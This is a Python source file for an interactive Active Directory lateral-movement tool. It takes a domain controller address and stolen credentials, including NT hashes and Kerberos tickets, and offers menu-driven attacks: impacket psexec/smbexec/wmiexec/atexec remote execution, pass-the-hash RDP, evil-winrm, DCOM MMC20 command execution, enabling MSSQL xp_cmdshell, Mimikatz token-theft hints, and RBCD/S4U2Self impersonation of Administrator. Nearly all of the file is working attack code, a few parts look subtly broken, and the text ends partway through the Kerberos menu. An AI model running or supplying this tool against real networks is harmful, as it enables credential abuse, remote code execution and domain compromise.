#!/usr/bin/env python3


import argparse
import sys
import os
import glob
import getpass
import socket
import signal
import subprocess
import time
import re
import ipaddress
from datetime import datetime, timezone
from binascii import hexlify

# ─────────────────────────────────────────────────────────────────────────────
# GLOBALS & INTERRUPT HANDLING
# ─────────────────────────────────────────────────────────────────────────────
INTERRUPTED = False

def signal_handler(sig, frame):
    global INTERRUPTED
    INTERRUPTED = True
    print(f"\n{Y}[!] Interrupted by user (Ctrl+C). Exiting gracefully...{RS}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
B  = "\033[94m"
C  = "\033[96m"
W  = "\033[97m"
M  = "\033[95m"
BO = "\033[1m"
RS = "\033[0m"

# ─────────────────────────────────────────────────────────────────────────────
# UTILITY: VALIDATE IP / DOMAIN / CONNECTIVITY
# ─────────────────────────────────────────────────────────────────────────────
def validate_ip(ip_str):
    """Validate IP address format and basic reachability."""
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False

def check_host_reachable(ip, port=445, timeout=3):
    """Check if host is reachable on a given port."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

def resolve_domain(dc_ip, domain):
    """Try to resolve the domain via DNS."""
    try:
        socket.gethostbyname(domain)
        return True
    except socket.gaierror:
        return False

def validate_lab_config(dc_ip, domain):
    """Comprehensive validation of lab configuration."""
    errors = []
    warnings = []

    # IP validation
    if not validate_ip(dc_ip):
        errors.append(f"Invalid IP address format: '{dc_ip}'")
    else:
        # Check common ports
        ports_to_check = {
            445: "SMB",
            135: "RPC/DCOM",
            3389: "RDP",
            5985: "WinRM (HTTP)",
            5986: "WinRM (HTTPS)",
            88: "Kerberos",
            1433: "MSSQL"
        }

        open_ports = []
        for port, name in ports_to_check.items():
            if check_host_reachable(dc_ip, port, timeout=2):
                open_ports.append(f"{name} ({port})")

        if not open_ports:
            warnings.append(f"No common Windows ports open on {dc_ip}. Is this the correct DC IP?")
        else:
            print(f"  {G}[+] Reachable ports: {', '.join(open_ports)}{RS}")

    # Domain validation
    if not domain or '.' not in domain:
        errors.append(f"Invalid domain format: '{domain}' (expected FQDN like domain.com)")

    if not resolve_domain(dc_ip, domain) and not resolve_domain(dc_ip, f"dc.{domain}"):
        warnings.append(f"Cannot resolve domain '{domain}'. DNS may be misconfigured or domain is wrong.")

    # Print results
    if errors:
        print(f"\n{R}{BO}[✗] CRITICAL ERRORS:{RS}")
        for err in errors:
            print(f"  {R}  • {err}{RS}")

    if warnings:
        print(f"\n{Y}{BO}[!] WARNINGS:{RS}")
        for warn in warnings:
            print(f"  {Y}  • {warn}{RS}")

    if errors:
        print(f"\n{R}[!] Please fix the errors above and try again.{RS}")
        return False

    if warnings:
        print(f"\n{Y}[?] Warnings detected. Continue anyway? (y/N): {RS}", end="")
        try:
            choice = input().strip().lower()
            if choice not in ('y', 'yes'):
                print(f"{Y}[~] Aborted by user.{RS}")
                return False
        except (EOFError, KeyboardInterrupt):
            print(f"\n{Y}[~] Aborted.{RS}")
            return False

    return True

# ─────────────────────────────────────────────────────────────────────────────
# SAFE INPUT HANDLER (Ctrl+C safe)
# ─────────────────────────────────────────────────────────────────────────────
def safe_input(prompt, default=""):
    """Input that handles Ctrl+C gracefully."""
    try:
        return input(prompt).strip()
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Y}[!] Input interrupted. Returning to menu...{RS}")
        return None

def safe_getpass(prompt):
    """getpass that handles Ctrl+C gracefully."""
    try:
        return getpass.getpass(prompt)
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Y}[!] Input interrupted. Returning to menu...{RS}")
        return None

# ─────────────────────────────────────────────────────────────────────────────
# IMPACKET IMPORTS (with graceful fallback)
# ─────────────────────────────────────────────────────────────────────────────
try:
    from impacket.krb5.ccache import CCache
    from impacket.krb5.asn1 import TGS_REP, AS_REP
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal, KerberosTime
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.smbconnection import SMBConnection
    from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
    from impacket.examples.wmiexec import WMIEXEC
    from impacket.examples.smbexec import SMBEXEC
    from impacket.examples.atexec import TSCH_EXEC
    from impacket.examples.psexec import PSEXEC
    from impacket.dcerpc.v5.dcomrt import DCOMConnection
    from impacket.dcerpc.v5.dcom import wmi
    from impacket.dcerpc.v5.dtypes import NULL
    from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
    from pyasn1.codec.ber import decoder, encoder
    IMPACKET_AVAILABLE = True
except ImportError as e:
    print(f"{Y}[!] Missing dependency: {e}{RS}")
    print(f"{Y}    Install: pip install impacket{RS}")
    IMPACKET_AVAILABLE = False

# ─────────────────────────────────────────────────────────────────────────────
# INTERACTIVE CONFIG
# ─────────────────────────────────────────────────────────────────────────────
def get_config():
    print(f"\n{M}{BO}╔═════════════════════════════════════════════════════╗")
    print(f"║               L A T E R A L   M O V E M E N T                ║")
    print(f"║     Abuse: AdminTo | CanRDP | CanPSRemote | DCOM | SQL       ║")
    print(f"╚══════════════════════════════════════════════════════════════╝{RS}")

    print(f"\n{C}{BO}[ Configuration ]{RS}")
    print(f"  {Y}Press Enter to use default value shown in [ ]{RS}\n")

    dc_ip = safe_input(f"  {W}DC IP      {C}[192.168.x.x.1.48]{W}: {RS}")
    if dc_ip is None:
        return None, None
    if not dc_ip:
        dc_ip = "192.168.x.x.1.48"

    domain = safe_input(f"  {W}Domain     {C}[domain.com]{W}:       {RS}")
    if domain is None:
        return None, None
    if not domain:
        domain = "domain.com"

    print(f"\n{B}[*] Validating lab configuration...{RS}")
    if not validate_lab_config(dc_ip, domain):
        return None, None

    print(f"\n  {G}[+] Using: {dc_ip} | {domain}{RS}\n")
    return dc_ip, domain


def get_creds():
    print(f"\n{C}{BO}[ Credentials ]{RS}")

    username = safe_input(f"  {W}Username {C}[Administrator]{W}: {RS}")
    if username is None:
        return None, None, None, None
    if not username:
        username = "Administrator"

    print(f"\n  {W}Auth method:{RS}")
    print(f"    {C}[1]{W} Password{RS}")
    print(f"    {C}[2]{W} NT Hash{RS}")
    print(f"    {C}[3]{W} Kerberos Ticket (ccache){RS}")
    ch = safe_input(f"\n  Choice {C}[1]{W}: {RS}")
    if ch is None:
        return None, None, None, None
    ch = ch or "1"

    password = ""
    nt_hash  = ""
    ccache   = ""

    if ch == "2":
        nt_hash = safe_input(f"  {W}NT Hash: {RS}")
        if nt_hash is None:
            return None, None, None, None
    elif ch == "3":
        ccache = safe_input(f"  {W}ccache file path: {RS}")
        if ccache is None:
            return None, None, None, None
        if not os.path.exists(ccache):
            print(f"{R}[!] File not found: {ccache}{RS}")
            return None, None, None, None
    else:
        password = safe_getpass(f"  {W}Password: {RS}")
        if password is None:
            return None, None, None, None

    return username, password, nt_hash, ccache


# ─────────────────────────────────────────────────────────────────────────────
# MENU
# ─────────────────────────────────────────────────────────────────────────────
def show_menu():
    print(f"\n  {C}┌─────────────────────────────────────────────────────────────┐")
    print(f"  │              SELECT LATERAL MOVEMENT TECHNIQUE              │")
    print(f"  ├─────────────────────────────────────────────────────────────┤")
    print(f"  │  {W}[1] AdminTo    → psexec / smbexec / wmiexec / atexec   {C}  │")
    print(f"  │  {W}[2] CanRDP     → Remote Desktop (Pass-the-Hash)         {C}  │")
    print(f"  │  {W}[3] CanPSRemote→ PowerShell Remoting (WinRM)            {C}  │")
    print(f"  │  {W}[4] ExecuteDCOM→ DCOM / MMC20.Application                {C}  │")
    print(f"  │  {W}[5] SQLAdmin   → MSSQL xp_cmdshell                       {C}  │")
    print(f"  │  {W}[6] HasSession  → Session enumeration / token theft       {C}  │")
    print(f"  │  {W}[7] RemoteInt   → RestrictedAdmin RDP                    {C}  │")
    print(f"  │  {W}[8] ClaimSpec  → RBCD / S4U2Self (Resource-Based CD)     {C}  │")
    print(f"  │  {W}[9] Kerberos   → Ticket dump / parse / convert / PTT     {C}  │")
    print(f"  │  {W}[0] exit                                                  {C}  │")
    print(f"  └─────────────────────────────────────────────────────────────┘{RS}")
    return safe_input(f"\n  {W}❯ {RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 1 — AdminTo (psexec, smbexec, wmiexec, atexec)
# ════════════════════════════════════════════════════════════════════════════
def technique_adminto(target, domain, username, password, nt_hash, ccache):
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 1: AdminTo — Remote Execution ]{RS}")
    print(f"  {Y}Requires: Local Admin on target{RS}")
    print(f"  {Y}Edges: AdminTo, MemberOf (local admin){RS}\n")

    print(f"  {W}Select method:{RS}")
    print(f"    {C}[1]{W} psexec  — Upload service binary (noisiest, most reliable){RS}")
    print(f"    {C}[2]{W} smbexec — Create temp service per command (semi-interactive){RS}")
    print(f"    {C}[3]{W} wmiexec — WMI/DCOM process creation (stealthiest){RS}")
    print(f"    {C}[4]{W} atexec  — Scheduled task (runs as SYSTEM){RS}")

    method = safe_input(f"\n  Choice {C}[2]{W}: {RS}")
    if method is None:
        return
    method = method or "2"

    command = safe_input(f"  {W}Command to execute {C}[whoami]{W}: {RS}")
    if command is None:
        return
    command = command or "whoami"

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
    hashes = f"{lm_hash}:{nt_hash}" if nt_hash else None

    print(f"\n  {B}[*] Connecting to {target}...{RS}")

    try:
        if method == "1":
            execer = PSEXEC(command, None, None, None, username=username,
                           password=password, domain=domain, hashes=hashes,
                           aesKey=None, doKerberos=False, kdcHost=target)
            execer.run(target)
        elif method == "2":
            execer = SMBEXEC(f"{domain}\\{username}:{password}@{target}", share="C$")
            if nt_hash:
                execer = SMBEXEC(f"{domain}\\{username}@{target}", share="C$", hashes=hashes)
            execer.run(command)
            output = execer.getOutput()
            if output:
                print(f"\n{G}{BO}[ OUTPUT ]{RS}")
                print(f"{W}{output}{RS}")
        elif method == "3":
            execer = WMIEXEC(f"{domain}\\{username}:{password}@{target}", share="ADMIN$")
            if nt_hash:
                execer = WMIEXEC(f"{domain}\\{username}@{target}", share="ADMIN$", hashes=hashes)
            execer.run(command)
            output = execer.getOutput()
            if output:
                print(f"\n{G}{BO}[ OUTPUT ]{RS}")
                print(f"{W}{output}{RS}")
        elif method == "4":
            execer = TSCH_EXEC(f"{domain}\\{username}:{password}@{target}", command)
            if nt_hash:
                execer = TSCH_EXEC(f"{domain}\\{username}@{target}", command, hashes=hashes)
            execer.run(target)
        else:
            print(f"{R}[!] Invalid method{RS}")
            return

        print(f"\n  {G}[+] Execution completed successfully{RS}")

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "logon failure" in error_msg or "status_logon_failure" in error_msg:
            print(f"  {R}[!] Authentication failed — wrong credentials or no AdminTo edge{RS}")
        elif "access denied" in error_msg or "status_access_denied" in error_msg:
            print(f"  {R}[!] Access denied — user is not local admin on target{RS}")
        elif "rpc_s_server_unavailable" in error_msg or "unavailable" in error_msg:
            print(f"  {R}[!] RPC server unavailable — target may be down or firewall blocking{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — target unreachable or wrong IP{RS}")
        elif "name or service not known" in error_msg or "getaddrinfo" in error_msg:
            print(f"  {R}[!] Cannot resolve target — check domain/DNS settings{RS}")
        else:
            print(f"  {R}[!] Error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 2 — CanRDP (xfreerdp with pass-the-hash)
# ════════════════════════════════════════════════════════════════════════════
def technique_canrdp(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 2: CanRDP — Remote Desktop ]{RS}")
    print(f"  {Y}Requires: CanRDP edge or Remote Desktop Users group{RS}")
    print(f"  {Y}Port: 3389 (RDP){RS}\n")

    if not check_host_reachable(target, 3389, timeout=3):
        print(f"  {Y}[!] Port 3389 (RDP) is not reachable on {target}{RS}")
        print(f"  {Y}    Target may be down, wrong IP, or RDP disabled.{RS}")
        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
        if cont is None or cont.lower() not in ('y', 'yes'):
            return

    print(f"  {W}Select RDP client:{RS}")
    print(f"    {C}[1]{W} xfreerdp (recommended, supports /pth){RS}")
    print(f"    {C}[2]{W} rdesktop{RS}")
    print(f"    {C}[3]{W} Print command only (manual execution){RS}")

    client = safe_input(f"\n  Choice {C}[1]{W}: {RS}")
    if client is None:
        return
    client = client or "1"

    if client == "3":
        print(f"\n  {C}Commands:{RS}")
        if nt_hash:
            print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert:ignore{RS}")
            print(f"  {W}  xfreerdp /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert-ignore{RS}")
        else:
            print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /p:{password} /cert:ignore{RS}")
        return

    if client == "1":
        xfreerdp3_check = subprocess.run(["which", "xfreerdp3"], capture_output=True)
        cmd = ["xfreerdp3" if xfreerdp3_check.returncode == 0 else "xfreerdp"]
        cmd.extend([f"/v:{target}", f"/u:{username}", f"/d:{domain}", "/cert:ignore", "/sec:nla", "/auto-reconnect"])
        if nt_hash:
            cmd.append(f"/pth:{nt_hash}")
        else:
            cmd.append(f"/p:{password}")
    else:
        cmd = ["rdesktop", "-u", username, "-d", domain, target]
        if password:
            cmd.extend(["-p", password])

    print(f"\n  {B}[*] Launching RDP session...{RS}")
    print(f"  {Y}  {' '.join(cmd)}{RS}\n")

    try:
        subprocess.run(cmd)
    except FileNotFoundError:
        print(f"  {R}[!] RDP client not found. Install xfreerdp or rdesktop.{RS}")
    except KeyboardInterrupt:
        print(f"\n{Y}[!] RDP session interrupted.{RS}")
    except Exception as e:
        print(f"  {R}[!] RDP error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 3 — CanPSRemote (PowerShell Remoting / WinRM)
# ════════════════════════════════════════════════════════════════════════════
def technique_canpsremote(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 3: CanPSRemote — PowerShell Remoting ]{RS}")
    print(f"  {Y}Requires: CanPSRemote edge or WinRM enabled + admin{RS}")
    print(f"  {Y}Ports: 5985 (HTTP) / 5986 (HTTPS){RS}\n")

    if not check_host_reachable(target, 5985, timeout=3) and not check_host_reachable(target, 5986, timeout=3):
        print(f"  {Y}[!] WinRM ports (5985/5986) not reachable on {target}{RS}")
        print(f"  {Y}    WinRM may not be enabled or target is wrong.{RS}")
        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
        if cont is None or cont.lower() not in ('y', 'yes'):
            return

    command = safe_input(f"  {W}PowerShell command {C}[whoami]{W}: {RS}")
    if command is None:
        return
    command = command or "whoami"

    print(f"\n  {B}[*] Attempting WinRM connection...{RS}")

    try:
        evil_check = subprocess.run(["which", "evil-winrm"], capture_output=True, text=True)
        if evil_check.returncode == 0:
            print(f"  {G}[+] evil-winrm found{RS}")
            cmd = ["evil-winrm", "-i", target, "-u", username, "-d", domain]
            if password:
                cmd.extend(["-p", password])
            if nt_hash:
                cmd.extend(["-H", nt_hash])
            print(f"  {Y}  {' '.join(cmd)}{RS}")
            subprocess.run(cmd)
            return
    except Exception:
        pass

    print(f"\n  {C}Manual PowerShell Remoting commands:{RS}")
    print(f"  {W}  # Enter-PSSession:{RS}")
    print(f"  {W}  $cred = New-Object System.Management.Automation.PSCredential('{domain}\\{username}', (ConvertTo-SecureString '{password}' -AsPlainText -Force)){RS}")
    print(f"  {W}  Enter-PSSession -ComputerName {target} -Credential $cred{RS}")
    print(f"\n  {W}  # Invoke-Command:{RS}")
    print(f"  {W}  Invoke-Command -ComputerName {target} -Credential $cred -ScriptBlock {{ {command} }}{RS}")

    print(f"\n  {Y}[!] Install evil-winrm for automated connection:{RS}")
    print(f"  {Y}    gem install evil-winrm{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 4 — ExecuteDCOM (MMC20.Application)
# ════════════════════════════════════════════════════════════════════════════
def technique_executedcom(target, domain, username, password, nt_hash):
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 4: ExecuteDCOM — DCOM Lateral Movement ]{RS}")
    print(f"  {Y}Requires: ExecuteDCOM edge + local admin{RS}")
    print(f"  {Y}Methods: MMC20.Application, ShellWindows, ShellBrowserWindow{RS}\n")

    print(f"  {W}Select DCOM method:{RS}")
    print(f"    {C}[1]{W} MMC20.Application (Document.ActiveView.ExecuteShellCommand){RS}")
    print(f"    {C}[2]{W} ShellWindows (NavigateAndFind2 + ShellExecute){RS}")

    method = safe_input(f"\n  Choice {C}[1]{W}: {RS}")
    if method is None:
        return
    method = method or "1"

    command = safe_input(f"  {W}Command to execute {C}[calc.exe]{W}: {RS}")
    if command is None:
        return
    command = command or "calc.exe"

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
    hashes = f"{lm_hash}:{nt_hash}" if nt_hash else None

    print(f"\n  {B}[*] Connecting via DCOM to {target}...{RS}")

    try:
        if method == "1":
            dcom = DCOMConnection(target, username, password, domain,
                                 lmhash=bytes.fromhex(lm_hash) if lm_hash else b"",
                                 nthash=bytes.fromhex(nt_hash) if nt_hash else b"",
                                 oxidResolver=True, doKerberos=False, kdcHost=target)

            interface = dcom.CoCreateInstanceEx(wmi.CLSID_MMC20Application, wmi.IID_IDispatch)
            iMMC = interface.RemQueryInterface(0, wmi.IID_MMC20Application)

            print(f"  {G}[+] MMC20.Application acquired{RS}")
            print(f"  {B}[*] Executing: {command}{RS}")

            iMMC.Document.ActiveView.ExecuteShellCommand(command, None, None, "7")
            print(f"  {G}[+] Command executed via MMC20.Application{RS}")
            dcom.disconnect()

        else:
            print(f"  {Y}[~] ShellWindows method requires additional setup{RS}")
            print(f"  {C}Manual PowerShell command:{RS}")
            prog_id = "MMC20.Application"
            print(f"  {W}  $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\"{prog_id}\", \"{target}\")){RS}")
            print(f"  {W}  $dcom.Document.ActiveView.ExecuteShellCommand(\"{command}\", $null, $null, \"7\"){RS}")

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "access denied" in error_msg:
            print(f"  {R}[!] Access denied — no ExecuteDCOM edge or not admin{RS}")
        elif "rpc_s_server_unavailable" in error_msg:
            print(f"  {R}[!] DCOM/RPC unavailable — firewall or wrong target{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — wrong IP or target down{RS}")
        else:
            print(f"  {R}[!] DCOM error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 5 — SQLAdmin (MSSQL xp_cmdshell)
# ════════════════════════════════════════════════════════════════════════════
def technique_sqladmin(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 5: SQLAdmin — MSSQL xp_cmdshell ]{RS}")
    print(f"  {Y}Requires: SQLAdmin edge (sysadmin on MSSQL instance){RS}")
    print(f"  {Y}Port: 1433 (MSSQL){RS}\n")

    if not check_host_reachable(target, 1433, timeout=3):
        print(f"  {Y}[!] Port 1433 (MSSQL) not reachable on {target}{RS}")
        print(f"  {Y}    Wrong IP, custom port, or MSSQL not running.{RS}")
        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
        if cont is None or cont.lower() not in ('y', 'yes'):
            return

    instance = safe_input(f"  {W}Instance name {C}[MSSQLSERVER]{W}: {RS}")
    if instance is None:
        return
    instance = instance or "MSSQLSERVER"

    command = safe_input(f"  {W}Command to execute {C}[whoami]{W}: {RS}")
    if command is None:
        return
    command = command or "whoami"

    print(f"\n  {B}[*] Connecting to MSSQL on {target}...{RS}")

    try:
        from impacket.tds import MSSQL
        mssql = MSSQL(target, port=1433)
        mssql.connect()

        if password:
            mssql.login(None, username, password, domain, None, None)
        elif nt_hash:
            mssql.login(None, username, "", domain, None, None, 
                       hashes=f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}")

        print(f"  {G}[+] MSSQL authenticated as {username}{RS}")

        print(f"  {B}[*] Enabling xp_cmdshell...{RS}")
        mssql.sql_query("EXEC sp_configure 'show advanced options', 1; RECONFIGURE;")
        mssql.sql_query("EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;")

        print(f"  {B}[*] Executing: {command}{RS}")
        mssql.sql_query(f"EXEC xp_cmdshell '{command}';")

        results = mssql.rows
        if results:
            print(f"\n{G}{BO}[ OUTPUT ]{RS}")
            for row in results:
                if row[0]:
                    print(f"  {W}{row[0]}{RS}")

        mssql.disconnect()
        print(f"\n  {G}[+] Execution completed{RS}")

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except ImportError:
        print(f"  {Y}[!] MSSQL module not available in this impacket version{RS}")
        print(f"  {C}Manual command:{RS}")
        print(f"  {W}  python3 mssqlclient.py {domain}/{username}@{target} -windows-auth{RS}")
        print(f"  {W}  SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;{RS}")
        print(f"  {W}  SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;{RS}")
        print(f"  {W}  SQL> EXEC xp_cmdshell '{command}';{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "login failed" in error_msg:
            print(f"  {R}[!] MSSQL login failed — wrong credentials{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — wrong IP or MSSQL not running{RS}")
        else:
            print(f"  {R}[!] MSSQL error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 6 — HasSession (Session enumeration)
# ════════════════════════════════════════════════════════════════════════════
def technique_hassession(target, domain, username, password, nt_hash):
    if not IMPACKET_AVAILABLE:
        print(f"{R}[!] Impacket not available.{RS}")
        return

    print(f"\n{C}{BO}[ TECHNIQUE 6: HasSession — Session Enumeration ]{RS}")
    print(f"  {Y}Requires: Any authenticated access to target{RS}")
    print(f"  {Y}Goal: Find logged-in users for token theft / session hijack{RS}\n")

    lm_hash = "aad3b435b51404eeaad3b435b51404ee" if nt_hash else ""
    hashes = f"{lm_hash}:{nt_hash}" if nt_hash else None

    print(f"  {B}[*] Enumerating sessions on {target}...{RS}")

    try:
        smb_conn = SMBConnection(target, target, sess_port=445, timeout=10)

        if nt_hash:
            smb_conn.login(username, "", domain, lm_hash, nt_hash)
        else:
            smb_conn.login(username, password, domain)

        print(f"  {G}[+] SMB authenticated as {username}@{domain}{RS}")

        try:
            from impacket.dcerpc.v5.srvs import NetrSessionEnum
            from impacket.dcerpc.v5.transport import SMBTransport

            rpctransport = SMBTransport(target, 445, r'\\srvsvc', smb_conn)
            dce = rpctransport.get_dce_rpc()
            dce.connect()
            dce.bind(NetrSessionEnum.get_uuid())

            print(f"  {Y}[~] NetSessEnum requires admin privileges{RS}")

        except Exception as e:
            print(f"  {Y}[~] Session enumeration via RPC failed: {e}{RS}")

        print(f"\n  {B}[*] Listing accessible shares...{RS}")
        shares = smb_conn.listShares()
        print(f"  {'─'*50}")
        for s in shares:
            share_name = s['shi1_netname'][:-1]
            print(f"  {W}  \\{target}\\{share_name}{RS}")
        print(f"  {'─'*50}")

        try:
            from impacket.dcerpc.v5.samr import SamrConnect, SAM_SERVER_ENUMERATE_DOMAINS
            print(f"\n  {B}[*] Attempting SAMR enumeration...{RS}")
            print(f"  {Y}[~] Use secretsdump or rpcclient for full enumeration{RS}")
        except:
            pass

        smb_conn.close()

        print(f"\n  {C}For session hijacking, use:{RS}")
        print(f"  {W}  • Mimikatz: sekurlsa::logonpasswords{RS}")
        print(f"  {W}  • Mimikatz: token::elevate + token::impersonate{RS}")
        print(f"  {W}  • Rubeus:   triage + dump{RS}")

    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted by user.{RS}")
    except Exception as e:
        error_msg = str(e).lower()
        if "logon failure" in error_msg:
            print(f"  {R}[!] Authentication failed{RS}")
        elif "timeout" in error_msg:
            print(f"  {R}[!] Connection timeout — wrong IP{RS}")
        else:
            print(f"  {R}[!] Error: {e}{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 7 — RemoteInteractiveLogonRight (RestrictedAdmin RDP)
# ════════════════════════════════════════════════════════════════════════════
def technique_remoteinteractive(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 7: RemoteInteractiveLogonRight — RestrictedAdmin RDP ]{RS}")
    print(f"  {Y}Requires: RemoteInteractiveLogonRight + NTLM hash (Pass-the-Hash){RS}")
    print(f"  {Y}Note: RestrictedAdmin mode allows PTH over RDP{RS}\n")

    if not nt_hash and not password:
        print(f"  {Y}[!] RestrictedAdmin requires credentials{RS}")
        return

    if not check_host_reachable(target, 3389, timeout=3):
        print(f"  {Y}[!] Port 3389 (RDP) not reachable on {target}{RS}")
        cont = safe_input(f"  {W}Continue anyway? (y/N): {RS}")
        if cont is None or cont.lower() not in ('y', 'yes'):
            return

    print(f"  {B}[*] RestrictedAdmin RDP allows Pass-the-Hash without password{RS}")
    print(f"  {C}Command:{RS}")

    if nt_hash:
        print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert:ignore /sec:nla{RS}")
        print(f"  {W}  xfreerdp /v:{target} /u:{username} /d:{domain} /pth:{nt_hash} /cert-ignore /sec:nla{RS}")
    else:
        print(f"  {W}  xfreerdp3 /v:{target} /u:{username} /d:{domain} /p:{password} /cert:ignore /sec:nla{RS}")

    print(f"\n  {Y}[!] Target must have 'DisableRestrictedAdmin' registry set to 0{RS}")
    print(f"  {Y}    Check: reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v DisableRestrictedAdmin{RS}")

    launch = safe_input(f"\n  {W}Launch xfreerdp now? (y/N): {RS}")
    if launch and launch.lower() in ('y', 'yes'):
        try:
            xfreerdp3_check = subprocess.run(["which", "xfreerdp3"], capture_output=True)
            cmd = ["xfreerdp3" if xfreerdp3_check.returncode == 0 else "xfreerdp"]
            cmd.extend([f"/v:{target}", f"/u:{username}", f"/d:{domain}", "/cert:ignore", "/sec:nla"])
            if nt_hash:
                cmd.append(f"/pth:{nt_hash}")
            else:
                cmd.append(f"/p:{password}")
            subprocess.run(cmd)
        except FileNotFoundError:
            print(f"  {R}[!] xfreerdp not found{RS}")
        except KeyboardInterrupt:
            print(f"\n{Y}[!] Session interrupted.{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 8 — ClaimSpecialIdentity (RBCD / S4U2Self)
# ════════════════════════════════════════════════════════════════════════════
def technique_claimspecial(target, domain, username, password, nt_hash):
    print(f"\n{C}{BO}[ TECHNIQUE 8: ClaimSpecialIdentity — RBCD / S4U2Self ]{RS}")
    print(f"  {Y}Requires: GenericWrite/GenericAll on computer account (RBCD){RS}")
    print(f"  {Y}          OR TrustedToAuthForDelegation (S4U2Self){RS}\n")

    print(f"  {W}Select RBCD abuse method:{RS}")
    print(f"    {C}[1]{W} Set RBCD on target (requires LDAP + computer account control){RS}")
    print(f"    {C}[2]{W} S4U2Self (requires TrustedToAuthForDelegation){RS}")
    print(f"    {C}[3]{W} Print rbcd.py / getST.py commands{RS}")

    method = safe_input(f"\n  Choice {C}[3]{W}: {RS}")
    if method is None:
        return
    method = method or "3"

    attacker_spn = safe_input(f"  {W}Attacker SPN/computer {C}[ATTACKER$]{W}: {RS}")
    if attacker_spn is None:
        return
    attacker_spn = attacker_spn or "ATTACKER$"

    if method == "3":
        print(f"\n  {C}Step 1: Set RBCD on target (as domain admin or with GenericWrite){RS}")
        print(f"  {W}  python3 rbcd.py -delegate-from '{attacker_spn}' -delegate-to '{target}$' -dc-ip {target} -action write '{domain}/{username}:{password}'{RS}")
        print(f"\n  {C}Step 2: Request service ticket with S4U2Self{RS}")
        print(f"  {W}  python3 getST.py -spn cifs/{target}.{domain} -impersonate Administrator -dc-ip {target} '{domain}/{attacker_spn}' -k -no-pass{RS}")
        print(f"\n  {C}Step 3: Use the ticket{RS}")
        print(f"  {W}  export KRB5CCNAME=Administrator.ccache{RS}")
        print(f"  {W}  python3 psexec.py -k -no-pass '{domain}/Administrator@{target}.{domain}'{RS}")
        return

    if method == "1":
        print(f"\n  {Y}[!] Automated RBCD requires ldap3. Showing commands...{RS}")
        print(f"  {W}  python3 rbcd.py -delegate-from '{attacker_spn}' -delegate-to '{target}$' -dc-ip {target} -action write '{domain}/{username}:{password}'{RS}")
    elif method == "2":
        print(f"\n  {Y}[!] Automated S4U2Self requires impacket getST. Showing commands...{RS}")
        print(f"  {W}  python3 getST.py -spn cifs/{target}.{domain} -impersonate Administrator -dc-ip {target} '{domain}/{attacker_spn}' -k -no-pass{RS}")


# ════════════════════════════════════════════════════════════════════════════
# TECHNIQUE 9 — Kerberos (original functionality preserved)
# ════════════════════════════════════════════════════════════════════════════
def technique_kerberos_menu(dc_ip, domain):
    print(f"\n{C}{BO}[ TECHNIQUE 9: Kerberos Ticket Operations ]{RS}")
    print(f"  {W}Select operation:{RS}")
    print(f"    {C}[1]{W} dump     — Remote hash dump via DCE/RPC{RS}")
    print(f"    {C}[2]{W} ccache   — Parse .ccache files on disk{RS}")
    print(f"    {C}[3]{W} convert  — Convert .kirbi ↔ .ccache{RS}")
